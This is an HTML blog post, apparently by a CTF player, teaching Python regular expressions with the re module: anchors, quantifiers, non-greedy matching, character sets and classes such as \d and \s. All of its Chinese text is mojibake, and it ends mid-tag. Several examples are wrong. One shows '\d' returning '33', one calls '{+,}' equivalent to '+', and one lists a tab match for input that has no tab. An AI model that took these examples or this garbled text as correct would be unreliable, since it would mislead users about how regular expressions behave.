        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>ä¹‹å‰æ‰“CTFç»å¸¸æ€§çš„å› ä¸ºä¸ä¼šå†™è„šæœ¬è€Œå»æ‰‹æ’¸ï¼Œè¿™å¤§å¤§é™ä½äº†æ•ˆç‡ï¼Œè€Œä¸”æœ‰çš„é¢˜ç”±äºæ—¶é—´é™åˆ¶ï¼Œæ˜¾ç„¶æ‰‹æ’¸è¡Œä¸é€šã€‚</p><p>è€Œä¸ä¼šå†™è„šæœ¬ç»å¸¸æ˜¯å› ä¸ºè‡ªå·±ä¸ä¼šå¤„ç†å¾—åˆ°çš„æ•°æ®ï¼Œå¦‚ä½•è¿‡æ»¤ã€æ‹¼æ¥ã€‚æ‰€ä»¥ä»Šå¤©å­¦ä¹ ä¸€ä¸‹pythonçš„reæ¨¡å—ï¼Œæ­£åˆ™æ›¿æ¢ï¼Œä»¥åŠåˆšåˆšä»Li4n0å­¦é•¿è„šæœ¬ä¸­å‘ç°çš„å­—ç¬¦è¡¨æ›¿æ¢ã€‚</p><h3 id="æ­£åˆ™"><a href="#æ­£åˆ™" class="headerlink" title="æ­£åˆ™"></a>æ­£åˆ™</h3><h4 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="^å…ƒå­—ç¬¦"></a>^å…ƒå­—ç¬¦</h4><p>å­—ç¬¦ä¸²å¼€å§‹ä½ç½®ä¸åŒ¹é…è§„åˆ™ç¬¦åˆå°±åŒ¹é…ï¼Œå¦åˆ™ä¸åŒ¹é…</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^åŒ¹é…è§„åˆ™"</span>,<span class="string">"åŒ¹é…è§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…è§„åˆ™'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^åŒ¹é…è§„åˆ™"</span>,<span class="string">"åŒ¹é…sè§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p>[^a-z]åå–ï¼Œ</p><p>åŒ¹é…å‡ºé™¤å­—æ¯å¤–çš„å­—ç¬¦ï¼Œ^å…ƒå­—ç¬¦å¦‚æœå†™åˆ°å­—ç¬¦é›†é‡Œå°±æ˜¯åå–</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"[^a-z]"</span>, <span class="string">"åŒ¹é…sè§„åˆ™è¿™sä¸ªå­—ç¬¦ä¸²æ˜¯å¦såŒ¹é…fè§„åˆ™åˆ™reåˆ™åˆ™åˆ™"</span>)   <span class="comment">#åå–ï¼ŒåŒ¹é…å‡ºé™¤å­—æ¯å¤–çš„å­—ç¬¦</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'è¿™'</span>, <span class="string">'ä¸ª'</span>, <span class="string">'å­—'</span>, <span class="string">'ç¬¦'</span>, <span class="string">'ä¸²'</span>, <span class="string">'æ˜¯'</span>, <span class="string">'å¦'</span>, <span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-1"><a href="#å…ƒå­—ç¬¦-1" class="headerlink" title="$å…ƒå­—ç¬¦"></a>$å…ƒå­—ç¬¦</h4><p>å­—ç¬¦ä¸²ç»“æŸä½ç½®ä¸åŒ¹é…è§„åˆ™ç¬¦åˆå°±åŒ¹é…ï¼Œå¦åˆ™ä¸åŒ¹é…</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;a = re.findall(<span class="string">"åŒ¹é…è§„åˆ™$"</span>, <span class="string">"è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™"</span>)   <span class="comment">#å­—ç¬¦ä¸²ç»“æŸä½ç½®ä¸åŒ¹é…è§„åˆ™ç¬¦åˆå°±åŒ¹é…ï¼Œå¦åˆ™ä¸åŒ¹é…</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(a)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…è§„åˆ™'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-2"><a href="#å…ƒå­—ç¬¦-2" class="headerlink" title="*å…ƒå­—ç¬¦"></a>*å…ƒå­—ç¬¦</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„*å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯0ä¸ªæˆ–å¤šä¸ªåŸæœ¬å­—ç¬¦</p><p>åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æˆ–å¤šæ¬¡ï¼Œè´ªå©ªåŒ¹é…å‰å¯¼å­—ç¬¦æœ‰å¤šå°‘ä¸ªå°±åŒ¹é…å¤šå°‘ä¸ªå¾ˆè´ªå©ª</p><p>å¦‚æœè§„åˆ™é‡Œåªæœ‰ä¸€ä¸ªåˆ†ç»„ï¼Œå°½é‡é¿å…ç”¨*å¦åˆ™ä¼šæœ‰å¯èƒ½åŒ¹é…å‡ºç©ºå­—ç¬¦ä¸²</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™*"</span>,<span class="string">"è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™*"</span>,<span class="string">"è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…è§„'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™*"</span>,<span class="string">"whether this string is matching?"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-3"><a href="#å…ƒå­—ç¬¦-3" class="headerlink" title="+å…ƒå­—ç¬¦"></a>+å…ƒå­—ç¬¦</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„+å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯1ä¸ªæˆ–å¤šä¸ªåŸæœ¬å­—ç¬¦</p><p>åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–æ— é™æ¬¡ï¼Œè´ªå©ªåŒ¹é…å‰å¯¼å­—ç¬¦æœ‰å¤šå°‘ä¸ªå°±åŒ¹é…å¤šå°‘ä¸ªå¾ˆè´ªå©ª</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…+"</span>, <span class="string">"åŒ¹é…é…é…é…é…è§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„+å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯1ä¸ªæˆ–å¤šä¸ªåŸæœ¬å­—ç¬¦</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…é…é…é…é…'</span>, <span class="string">'åŒ¹é…'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…"><a href="#å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…" class="headerlink" title="?å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…"></a>?å…ƒå­—ç¬¦ï¼Œå’Œé˜²æ­¢è´ªå©ªåŒ¹é…</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„?å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯0ä¸ªæˆ–1ä¸ªåŸæœ¬å­—ç¬¦</p><p>åŒ¹é…ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–1æ¬¡</p><p>è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½æ˜¯å¯ä»¥é˜²æ­¢è´ªå©ªåŒ¹é…ï¼Œè¯¦æƒ…è§é˜²è´ªå©ªåŒ¹é…</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™?"</span>, <span class="string">"åŒ¹é…è§„è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„?å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦å¯ä»¥æ˜¯0ä¸ªæˆ–1ä¸ªåŸæœ¬å­—ç¬¦</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…è§„'</span>, <span class="string">'åŒ¹é…è§„åˆ™'</span>]</span><br></pre></td></tr></table></figure><h4 id><a href="#" class="headerlink" title=".*?"></a>.*?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">'my title="sw engineer". His is "hello world"'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*?)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw engineer</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¦‚æœæ²¡æœ‰ ?ï¼Œ åˆ™ä¼šæŠ“åˆ°æœ€é•¿çš„ä¸¤ä¸ªåŒå¼•å·ä¹‹é—´çš„å†…å®¹</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw enginee<span class="string">r". His is "</span>hello world</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦-èŒƒå›´"><a href="#å…ƒå­—ç¬¦-èŒƒå›´" class="headerlink" title="{}å…ƒå­—ç¬¦,èŒƒå›´"></a>{}å…ƒå­—ç¬¦,èŒƒå›´</h4><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„ {} å…ƒå­—ç¬¦ï¼‰å‰é¢çš„ä¸€ä¸ªå­—ç¬¦ï¼Œæ˜¯è‡ªå®šä¹‰å­—ç¬¦æ•°ï¼Œä½æ•°çš„åŸæœ¬å­—ç¬¦</p><p>{m}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mæ¬¡ï¼Œ{m,n}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡ï¼Œè‹¥çœç•¥nï¼Œåˆ™åŒ¹é…mè‡³æ— é™æ¬¡</p><p>{0,}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æˆ–å¤šæ¬¡,ç­‰åŒäº*å…ƒå­—ç¬¦<br>{+,}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–æ— é™æ¬¡,ç­‰åŒäº+å…ƒå­—ç¬¦<br>{0,1}åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦0æ¬¡æˆ–1æ¬¡,ç­‰åŒäº?å…ƒå­—ç¬¦</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;result = re.findall(<span class="string">"åŒ¹é…è§„åˆ™&#123;3&#125;"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…è§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#&#123;m&#125;åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mæ¬¡ï¼Œ&#123;m,n&#125;åŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡ï¼Œè‹¥çœç•¥nï¼Œåˆ™åŒ¹é…mè‡³æ— é™æ¬¡</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">æ‰“å°å‡º [<span class="string">'åŒ¹é…è§„åˆ™åˆ™åˆ™'</span>]</span><br></pre></td></tr></table></figure><h3 id="å…ƒå­—ç¬¦-å­—ç¬¦é›†"><a href="#å…ƒå­—ç¬¦-å­—ç¬¦é›†" class="headerlink" title="[]å…ƒå­—ç¬¦,å­—ç¬¦é›†"></a>[]å…ƒå­—ç¬¦,å­—ç¬¦é›†</h3><p>éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„ [] å…ƒå­—ç¬¦ï¼‰å¯¹åº”ä½ç½®æ˜¯[]é‡Œçš„ä»»æ„ä¸€ä¸ªå­—ç¬¦å°±åŒ¹é…</p><p>å­—ç¬¦é›†ã€‚å¯¹åº”çš„ä½ç½®å¯ä»¥æ˜¯å­—ç¬¦é›†ä¸­ä»»æ„å­—ç¬¦ã€‚å­—ç¬¦é›†ä¸­çš„å­—ç¬¦å¯ä»¥é€ä¸ªåˆ—å‡ºï¼Œä¹Ÿå¯ä»¥ç»™å‡ºèŒƒå›´ï¼Œå¦‚[abc]æˆ–[a-c]ã€‚[^abc]è¡¨ç¤ºå–åï¼Œå³éabcã€‚æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦åœ¨å­—ç¬¦é›†ä¸­éƒ½å¤±å»å…¶åŸæœ‰çš„ç‰¹æ®Šå«ä¹‰ã€‚ç”¨\åæ–œæ è½¬ä¹‰ <strong>æ¢å¤</strong> ç‰¹æ®Šå­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…[a,b,c]è§„åˆ™"</span>, <span class="string">"åŒ¹é…aè§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…bè§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)   <span class="comment">#éœ€è¦å­—ç¬¦ä¸²é‡Œå®Œå…¨ç¬¦åˆï¼ŒåŒ¹é…è§„åˆ™ï¼Œå°±åŒ¹é…ï¼Œï¼ˆè§„åˆ™é‡Œçš„ [] å…ƒå­—ç¬¦ï¼‰å¯¹åº”ä½ç½®æ˜¯[]é‡Œçš„ä»»æ„ä¸€ä¸ªå­—ç¬¦å°±åŒ¹é…</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹é…aè§„åˆ™'</span>, <span class="string">'åŒ¹é…bè§„åˆ™'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"åŒ¹é…[a,b,c]è§„åˆ™\t"</span>, <span class="string">"åŒ¹é…aè§„åˆ™è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…bè§„åˆ™åˆ™åˆ™åˆ™åˆ™"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'åŒ¹é…aè§„åˆ™\t'</span>]</span><br></pre></td></tr></table></figure><h4 id="åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰"><a href="#åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰" class="headerlink" title="åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰"></a>åæ–œæ åè¾¹è·Ÿæ™®é€šå­—ç¬¦å®ç°ç‰¹æ®ŠåŠŸèƒ½ï¼›ï¼ˆå³é¢„å®šä¹‰å­—ç¬¦ï¼‰</h4><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯åœ¨å­—ç¬¦é›†å’Œç»„é‡Œéƒ½æ˜¯æœ‰ç”¨çš„</p><p>\dåŒ¹é…ä»»ä½•åè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[0-9]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™2ä¸ªå­—ç¬¦ä¸²33æ˜¯å¦åŒ¹é…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\dåŒ¹é…ä»»ä½•åè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure><p>\d+å¦‚æœéœ€è¦åŒ¹é…ä¸€ä½æˆ–è€…å¤šä½æ•°çš„æ•°å­—æ—¶ç”¨</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\d"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™2ä¸ªå­—ç¬¦ä¸²33æ˜¯å¦åŒ¹é…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\dåŒ¹é…ä»»ä½•åè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'2'</span>, <span class="string">'33'</span>,  <span class="string">'5'</span>, <span class="string">'7'</span>]</span><br></pre></td></tr></table></figure><p>\DåŒ¹é…ä»»ä½•éæ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^0-9]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\D"</span>, <span class="string">"åŒ¹é…è§„åˆ™è¿™2ä¸ªå­—ç¬¦ä¸²33æ˜¯å¦åŒ¹é…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\DåŒ¹é…ä»»ä½•éåè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[^0-9]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'è¿™'</span>, <span class="string">'ä¸ª'</span>, <span class="string">'å­—'</span>, <span class="string">'ç¬¦'</span>, <span class="string">'ä¸²'</span>, <span class="string">'æ˜¯'</span>, <span class="string">'å¦'</span>, <span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>]</span><br></pre></td></tr></table></figure><p>\såŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[\t\n\r\f\v]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\s"</span>, <span class="string">"åŒ¹é…è§„åˆ™   è¿™2ä¸ªå­—ç¬¦ä¸²3æ˜¯å¦åŒ¹\né…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span class="comment">#\såŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[\t\n\r\f\v](æ¨ªå‘åˆ¶è¡¨ç¬¦ã€æ¢è¡Œã€å›è½¦ã€æ¢é¡µã€çºµå‘åˆ¶è¡¨ç¬¦)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'\t'</span>, <span class="string">' '</span>, <span class="string">' '</span>, <span class="string">'\n'</span>]</span><br></pre></td></tr></table></figure><p>\SåŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^\t\n\r\f\v]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"\S"</span>, <span class="string">"åŒ¹é…è§„åˆ™   è¿™2ä¸ªå­—ç¬¦ä¸²3æ˜¯å¦åŒ¹\né…è§„åˆ™5åˆ™åˆ™åˆ™7åˆ™"</span>)   <span 